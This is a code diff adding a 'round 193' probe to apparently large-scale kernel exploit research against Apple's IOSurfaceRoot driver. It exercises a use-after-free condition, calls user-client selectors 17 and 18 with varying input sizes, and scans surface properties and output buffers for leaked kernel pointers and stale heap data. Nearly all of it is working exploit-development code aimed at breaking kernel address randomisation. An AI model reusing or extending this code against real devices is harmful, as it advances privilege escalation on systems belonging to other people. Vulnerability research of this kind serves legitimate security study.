@@ -22278,6 +22278,222 @@ new_modes:
                 rlog("=== r=192 complete ===\n");
             }
 
+            if (rounds == 193) {
+                /*
+                 * r=193: IOSurface framework API scan during UAF.
+                 *
+                 * Test higher-level IOSurface APIs that might leak info
+                 * when the registry is corrupted:
+                 * - IOSurfaceCopyAllValues / IOSurfaceCopyValue
+                 * - IOSurfaceCreateMachPort / IOSurfaceLookupFromMachPort
+                 * - IOSurface XPC serialization
+                 * - IOSurface property queries during corrupted state
+                 *
+                 * Also: uninitialized heap read test - call sel17 with
+                 * SMALLER structureInput to see if remaining bytes contain
+                 * stale kernel data, then read back via property getters.
+                 */
+                rlog("=== r=193: IOSurface API probe during UAF ===\n");
+
+                /* Part A: IOSurface property dump */
+                rlog("\n  --- Part A: IOSurface property dump ---\n");
+                CFMutableDictionaryRef sp193 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w193 = 32, h193 = 32, bpe193 = 4;
+                CFNumberRef wn193 = CFNumberCreate(NULL, kCFNumberIntType, &w193);
+                CFNumberRef hn193 = CFNumberCreate(NULL, kCFNumberIntType, &h193);
+                CFNumberRef bn193 = CFNumberCreate(NULL, kCFNumberIntType, &bpe193);
+                int pf193 = 0x42475241;
+                CFNumberRef pfn193 = CFNumberCreate(NULL, kCFNumberIntType, &pf193);
+                CFDictionarySetValue(sp193, CFSTR("IOSurfaceWidth"), wn193);
+                CFDictionarySetValue(sp193, CFSTR("IOSurfaceHeight"), hn193);
+                CFDictionarySetValue(sp193, CFSTR("IOSurfaceBytesPerElement"), bn193);
+                CFDictionarySetValue(sp193, CFSTR("IOSurfacePixelFormat"), pfn193);
+                IOSurfaceRef surf193 = IOSurfaceCreate(sp193);
+                if (surf193) {
+                    IOSurfaceID sid193 = IOSurfaceGetID(surf193);
+                    rlog("  Surface ID: %u, alloc=%zu, bpr=%zu\n",
+                         sid193, IOSurfaceGetAllocSize(surf193),
+                         IOSurfaceGetBytesPerRow(surf193));
+
+                    /* Dump all properties */
+                    CFDictionaryRef allvals = IOSurfaceCopyAllValues(surf193);
+                    if (allvals) {
+                        CFIndex nkeys = CFDictionaryGetCount(allvals);
+                        rlog("  AllValues: %ld keys\n", (long)nkeys);
+                        const void **keys = malloc(nkeys * sizeof(void*));
+                        const void **vals = malloc(nkeys * sizeof(void*));
+                        CFDictionaryGetKeysAndValues(allvals, keys, vals);
+                        for (CFIndex k = 0; k < nkeys && k < 32; k++) {
+                            char kbuf[128] = {0};
+                            if (CFGetTypeID(keys[k]) == CFStringGetTypeID())
+                                CFStringGetCString(keys[k], kbuf, sizeof(kbuf),
+                                    kCFStringEncodingUTF8);
+                            CFTypeID vtype = CFGetTypeID(vals[k]);
+                            if (vtype == CFNumberGetTypeID()) {
+                                int64_t nv = 0;
+                                CFNumberGetValue(vals[k], kCFNumberSInt64Type, &nv);
+                                uint64_t uv = (uint64_t)nv;
+                                uint64_t ut = (uv & 0xF000FFFFFFFFFFFFULL) |
+                                    ((uv & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                                if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                    rlog("  *** KPTR key='%s' val=0x%016llx ***\n",
+                                         kbuf, (unsigned long long)uv);
+                                } else if (uv > 0x100000) {
+                                    rlog("  key='%s' val=0x%llx\n",
+                                         kbuf, (unsigned long long)uv);
+                                } else {
+                                    rlog("  key='%s' val=%lld\n",
+                                         kbuf, (long long)nv);
+                                }
+                            } else if (vtype == CFDataGetTypeID()) {
+                                CFDataRef d = vals[k];
+                                CFIndex dlen = CFDataGetLength(d);
+                                const uint8_t *dp = CFDataGetBytePtr(d);
+                                rlog("  key='%s' data[%ld]:", kbuf, (long)dlen);
+                                /* Scan for KPTR */
+                                for (CFIndex b = 0; b + 7 < dlen && b < 128; b += 8) {
+                                    uint64_t v;
+                                    memcpy(&v, dp + b, 8);
+                                    uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                        ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                                    if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                        rlog(" ***KPTR@%ld=0x%016llx***",
+                                             (long)b, (unsigned long long)v);
+                                    }
+                                }
+                                rlog("\n");
+                            } else {
+                                rlog("  key='%s' type=%lu\n", kbuf, (unsigned long)vtype);
+                            }
+                        }
+                        free(keys);
+                        free(vals);
+                        CFRelease(allvals);
+                    }
+
+                    /* Mach port operations */
+                    rlog("\n  Mach port ops:\n");
+                    mach_port_t sp = IOSurfaceCreateMachPort(surf193);
+                    rlog("  CreateMachPort: 0x%x\n", sp);
+                    if (sp) {
+                        IOSurfaceRef lkup = IOSurfaceLookupFromMachPort(sp);
+                        rlog("  LookupFromMachPort: %p (same=%d)\n",
+                             (void*)lkup, lkup == surf193);
+                        if (lkup) {
+                            IOSurfaceID lid = IOSurfaceGetID(lkup);
+                            rlog("  Looked up ID: %u\n", lid);
+                            CFRelease(lkup);
+                        }
+                        mach_port_deallocate(mach_task_self(), sp);
+                    }
+
+                    /* Specific interesting properties */
+                    rlog("\n  Specific properties:\n");
+                    const char *pkeys[] = {
+                        "IOSurfaceAddress", "IOSurfaceKernelAddress",
+                        "IOSurfaceRegistryID", "IOSurfaceGlobalID",
+                        "IOSurfaceOffset", "IOSurfaceAllocSize",
+                        "IOSurfaceSeed", "IOSurfaceIsGlobal",
+                        "IOSurfaceSubsamples", "IOSurfacePlaneInfo",
+                        NULL
+                    };
+                    for (int pk = 0; pkeys[pk]; pk++) {
+                        CFStringRef ks = CFStringCreateWithCString(NULL,
+                            pkeys[pk], kCFStringEncodingUTF8);
+                        CFTypeRef val = IOSurfaceCopyValue(surf193, ks);
+                        if (val) {
+                            if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                                int64_t nv = 0;
+                                CFNumberGetValue(val, kCFNumberSInt64Type, &nv);
+                                rlog("  %s = 0x%llx (%lld)\n", pkeys[pk],
+                                     (unsigned long long)(uint64_t)nv, (long long)nv);
+                            } else {
+                                rlog("  %s = (type %lu)\n", pkeys[pk],
+                                     (unsigned long)CFGetTypeID(val));
+                            }
+                            CFRelease(val);
+                        }
+                        CFRelease(ks);
+                    }
+
+                    CFRelease(surf193);
+                }
+                CFRelease(sp193);
+                CFRelease(wn193); CFRelease(hn193); CFRelease(bn193); CFRelease(pfn193);
+
+                /* Part B: sel17 with varying structureInput sizes */
+                rlog("\n  --- Part B: sel17 with different input sizes ---\n");
+                io_service_t svc193 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                for (int sz = 0; sz <= 32; sz += 8) {
+                    io_connect_t c193;
+                    IOServiceOpen(svc193, mach_task_self(), 0, &c193);
+                    mach_port_t wp193;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp193);
+                    mach_port_insert_right(mach_task_self(), wp193, wp193,
+                        MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t buf193[4] = {0x11, 0x22, 0x33, 0x44};
+                    uint64_t ref193 = 0xAA;
+                    kern_return_t kr193 = IOConnectCallAsyncMethod(c193, 17,
+                        wp193, &ref193, 1, NULL, 0,
+                        buf193, sz, NULL, NULL, NULL, NULL);
+                    rlog("  sel17(sz=%d): kr=0x%x\n", sz, kr193);
+                    IOServiceClose(c193);
+                    mach_port_deallocate(mach_task_self(), wp193);
+                }
+
+                /* Part C: sel18 (deregister) behavior probing */
+                rlog("\n  --- Part C: sel18 deregister probing ---\n");
+                for (int t = 0; t < 3; t++) {
+                    io_connect_t c18;
+                    IOServiceOpen(svc193, mach_task_self(), 0, &c18);
+                    mach_port_t wp18;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp18);
+                    mach_port_insert_right(mach_task_self(), wp18, wp18,
+                        MACH_MSG_TYPE_MAKE_SEND);
+
+                    /* Register */
+                    uint64_t buf18[3] = {1, 2, 3};
+                    uint64_t ref18 = 0xBB;
+                    kern_return_t kr_reg = IOConnectCallAsyncMethod(c18, 17,
+                        wp18, &ref18, 1, NULL, 0, buf18, 24, NULL, NULL, NULL, NULL);
+
+                    /* Try to read with structureOutput on sel18 */
+                    uint8_t out18[256];
+                    memset(out18, 0xEE, sizeof(out18));
+                    size_t osz18 = sizeof(out18);
+                    uint64_t sco18[8];
+                    uint32_t scc18 = 8;
+                    memset(sco18, 0, sizeof(sco18));
+
+                    kern_return_t kr_dereg = IOConnectCallMethod(c18, 18,
+                        NULL, 0, NULL, 0, sco18, &scc18, out18, &osz18);
+                    rlog("  sel18 trial %d: reg=0x%x dereg=0x%x scc=%u osz=%zu\n",
+                         t, kr_reg, kr_dereg, scc18, osz18);
+
+                    /* Check for data */
+                    for (uint32_t j = 0; j < scc18; j++) {
+                        if (sco18[j] != 0) rlog("    sco[%u]=0x%llx\n",
+                            j, (unsigned long long)sco18[j]);
+                    }
+                    if (osz18 > 0 && osz18 < 256) {
+                        uint64_t *op18 = (uint64_t *)out18;
+                        for (size_t q = 0; q < osz18/8; q++) {
+                            if (op18[q] != 0xEEEEEEEEEEEEEEEEULL)
+                                rlog("    out[%zu]=0x%016llx\n", q,
+                                    (unsigned long long)op18[q]);
+                        }
+                    }
+
+                    IOServiceClose(c18);
+                    mach_port_deallocate(mach_task_self(), wp18);
+                }
+
+                IOObjectRelease(svc193);
+                rlog("=== r=193 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
